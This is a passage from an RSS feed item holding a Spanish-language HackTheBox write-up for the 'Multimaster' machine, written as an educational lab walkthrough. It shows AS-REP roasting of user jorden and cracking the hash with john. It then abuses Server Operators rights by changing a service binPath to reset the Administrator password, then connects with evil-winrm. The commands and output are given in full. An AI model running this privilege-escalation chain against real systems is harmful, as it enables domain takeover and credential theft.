&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; Get-Aduser jorden | Set-ADAccountControl  -doesnotrequirepreauth $true
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Con&lt;code&gt;GetNPUsers.py&lt;/code&gt; esta vez si podamos obtener el hash&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ GetNPUsers.py MEGACORP.LOCAL/ -no-pass -usersfile users.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User tushikikatomo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lana doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andrew doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jorden@MEGACORP.LOCAL:8e7ea2a50a1602c925cf681fca176a58$a2a1627ed23fe85bdadc88c1a0b551f0ee10dfe43f7677fc6f1204e36d5e849c95932313e7fae6b9829be5d69f243279f32098db2118abef962bb1b7fa2caafe91ca22d2747690dea014ecc6e9f95e2dffdd8acac823f47c7e29a834cf910daa4cbdc19187bbf95d436e083a050e274fd15905b15f58c2e9cc23932efcac112a2adf3a59fd3de0342d4d35e33f7da5aeb2be18db5aa625a95adbde5c075843711be01945177e8fd7935c8edc5355ee98fce7b9d4becbc72e14606e5c4df3b1577f19b621457089150499cf8a79616110fe973d7e63bbde78641380be90733b621190a13c13968c6ed3d2d9ea85bf9603
[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedamos a crackearlo con &lt;code&gt;john&lt;/code&gt; y nos devuelve la contraseña en texto claro.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rainforest786    ($krb5asrep$23$jorden@MEGACORP.LOCAL)
1g 0:00:00:06 DONE (2023-04-02 17:01) 0.1550g/s 682666p/s 682666c/s 682666C/s rainian..railezs05
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos conectamos nuevamente con &lt;code&gt;evil-winrm&lt;/code&gt; y hubieramos migrado al usuario &lt;code&gt;jorden&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;❯ evil-winrm -i 10.10.10.179 -u 'jorden' -p 'rainforest786'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jorden\Documents&amp;gt; whoami
megacorp\jorden
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Antes vimos que este usuario formaba parte del grupo &lt;code&gt;Server Operators&lt;/code&gt;, aprovecharemos esto para cambiar la propiedad &lt;code&gt;binpath&lt;/code&gt; de un proceso el cual el forzaremos a desactivarse y al iniciarlo nuevamente nos ejecutara la sentencia que hayamos puesto.&lt;/p&gt;

&lt;p&gt;Cambiaremos el &lt;code&gt;binPath&lt;/code&gt; del proceso &lt;code&gt;browser&lt;/code&gt; para que al volver a iniciarse nos cambie la contraseña del usuario &lt;code&gt;Administrator&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\Users\jorden\Documents&amp;gt; sc.exe config browser binPath=&quot;C:\Windows\System32\cmd.exe /c net user Administrator fmiracle123$!&quot;
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\jorden\Documents&amp;gt; sc.exe stop browser

SERVICE_NAME: browser
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0xafc8
*Evil-WinRM* PS C:\Users\jorden\Documents&amp;gt; sc.exe start browser
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Verificamos y efectivamente cambiamos las claves del usuario &lt;code&gt;Administrator&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.179 -u 'Administrator' -p 'fmiracle123$!'
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\Administrator:fmiracle123$! (Pwn3d!)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente sera conectarnos, ir al directorio personal del usuario y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;❯ evil-winrm -i 10.10.10.179 -u 'Administrator' -p 'fmiracle123$!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
559ca9f9c145bc76f8504391a74710cc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y listo maquina pwneada!!&lt;/p&gt;

</description>
        <pubDate>Fri, 24 Mar 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Multimaster</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Multimaster</guid>
        
        <category>SqlInjection</category>
        
        <category>WAF Bypass</category>
        
        <category>Advanced Python Scripting</category>
        
        <category>Active Directory</category>
        
        <category>Smb Bruteforce</category>
        
        <category>RPC Enum</category>
        
        <category>Nishang</category>
        
        <category>CEF Debugger</category>
        
        <category>Server Operators</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
  </channel>
</rss>
